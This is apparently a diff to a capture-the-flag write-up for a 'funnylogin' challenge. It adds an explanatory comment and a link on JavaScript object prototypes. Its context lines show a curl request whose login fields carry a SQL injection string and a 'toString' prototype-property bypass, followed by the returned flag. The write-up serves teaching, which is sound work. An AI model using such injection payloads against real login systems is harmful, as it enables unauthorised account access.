@@ -93,7 +93,7 @@ So, we can do the following:
 ```
 > const isAdmin = {}
 undefined
-> isAdmin['asdf'] = true
+> isAdmin['asdf'] = true #Bracket notation is used to access an object property.
 true
 > isAdmin.
 isAdmin.__proto__             isAdmin.constructor           isAdmin.hasOwnProperty        isAdmin.isPrototypeOf         isAdmin.propertyIsEnumerable  
@@ -116,3 +116,5 @@ The following payload will do the trick:
 $ curl https://funnylogin.mc.ax/api/login -d "user=toString&pass='+UNION+SELECT+1--+-"  
 Found. Redirecting to /?flag=dice%7Bi_l0ve_java5cript!%7D
 ```
+
+Docs to understand how this works: https://developer.mozilla.org/en-US/docs/Learn/JavaScript/Objects/Object_prototypes
